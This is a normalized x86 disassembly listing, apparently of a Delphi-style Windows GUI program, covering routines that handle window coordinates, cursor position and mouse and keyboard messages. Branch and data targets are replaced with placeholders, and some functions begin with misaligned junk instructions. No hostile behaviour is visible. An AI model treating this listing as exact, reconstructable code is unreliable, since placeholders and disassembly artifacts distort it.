lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_4493d8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_403430
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403234
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_442558
test esi esi
je r-xdata
sub_443a98
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_403430
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_44491c
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403430
mov eax esi
call sub_442600
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_4425bc
mov ecx eax
xor edx edx
xor eax eax
call sub_419034
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403430
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_443b3c
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_443b6c
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_443bd8
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_443c98
sub_443c08
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_443c38
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_4426fc
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_443c64
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_443c98
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_443d6c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_443da0
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_443e38
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_4599ec
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_4599ec
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_442758
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_463240
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_403430
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_459930
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_403430
jmp r-xdata
sub_443fcc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_408ba0
mov edi eax
mov eax [ esi + 0x64 ]
call sub_408bcc
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_442758
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_4089f8
call sub_408994
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_408994
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_444074
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_4440a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_444068
push ebp
call sub_444074
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4440f4
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_444180
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_4441b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_443c38
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_4598a0
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403430
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_4598a0
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403430
sub_44423c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_442728
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_442df0
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_4441b8
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_444288
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_442728
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_4442a4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_442728
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_442df0
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_4441b8
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_403430
sub_4442fc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_443bd8
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_443b6c
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_443bd8
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_444398
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_4441b8
pop esi
pop ebx
retn
sub_4443bd
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_4441b8
pop esi
pop ebx
retn
sub_4443e3
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_4441b8
pop esi
pop ebx
retn
sub_44440d
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_4441b8
pop esi
pop ebx
retn
sub_444433
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_444468
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_443c38
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_4598a0
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_403430
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_4598a0
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_403430
sub_4444e0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_444518
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_4598a0
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_403430
sub_444550
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_442df0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_444518
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406dd8
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403430
sub_4445c8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_444518
pop esi
pop ebx
retn
sub_4445e8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_444518
pop esi
pop ebx
retn
sub_444608
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_4598a0
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_403430
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_44dd30
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_444660
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_442de0
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_442df0
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_443d6c
pop esi
retn
sub_4446a0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_443da0
sub_44474e
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_443000
mov cl 0x1
sub_444790
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_442d58
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_442d58
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_4447c0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_4447e4
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_406dd8
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_403430
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_443d6c
mov [ ebx + 0xc ] eax
sub_444888
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_442cac
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_442cac
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_44491c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_40317c
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_44234c
mov edx [ esp ]
mov eax esi
call sub_442328
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_4425d4
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_442618
sub_4449a0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_41900c
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_4426d0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_41905c
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_442578
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_444a2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_44491c
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_4493d8
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_4449a0
pop ecx
jmp r-xdata
sub_444a8c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_444b7a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444b81
lea eax [ ebp - 0x8 ]
